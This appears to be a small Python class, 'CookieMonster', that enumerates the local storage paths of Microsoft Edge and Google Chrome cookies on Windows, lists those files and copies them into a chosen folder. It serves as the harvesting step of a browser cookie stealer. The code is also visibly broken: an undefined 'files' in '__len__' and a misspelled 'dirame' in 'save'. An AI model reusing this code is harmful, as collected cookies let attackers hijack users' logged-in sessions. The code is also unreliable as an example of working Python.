import os
from shutil import copy


class CookieMonster(object):
    '''Fetches locally stored cookies'''
    def __init__(self):
        self.files = []
        self.lap = os.environ.get("localappdata")
        self.cookie_paths = ["{}\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!001\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\INetCookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\Cookies".format(self.lap),
                                "{}\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\#!002\\MicrosoftEdge\\User\\Default\\DOMStore".format(self.lap),
                                "{}\Google\\Chrome\\User Data\\Default\\Cookies".format(self.lap),
                                "{}\Microsoft\\Windows\\INetCookies".format(self.lap)]

    def __len__(self):
        for paths in self.cookie_paths:
            try:
                for filename in os.listdir(paths):
                    self.files.append(os.path.join(paths, filename))
            except Exception as e:
                pass
        return len(files)

    def __enter__(self):
        return self

    def __exit__(self, type, error, traceback):
        if error:
            print(error)

    '''attempts to display all cookies'''
    def show(self):
        for paths in self.cookie_paths:
            try:
                for filename in os.listdir(paths):
                    print(os.path.join(paths, filename))
            except Exception as e:
                pass

    '''save cookies to a directory using a path'''
    def save(self, path, dir_name):
        cookie_jar = os.path.join(path, dir_name)
        if not os.path.exists(cookie_jar):
            os.mkdir(dirame)
            for paths in self.cookie_paths:
                try:
                    for filename in os.listdir(paths):
                        copy(os.path.join(paths, filename), cookie_jar)
                except Exception as e:
                    pass

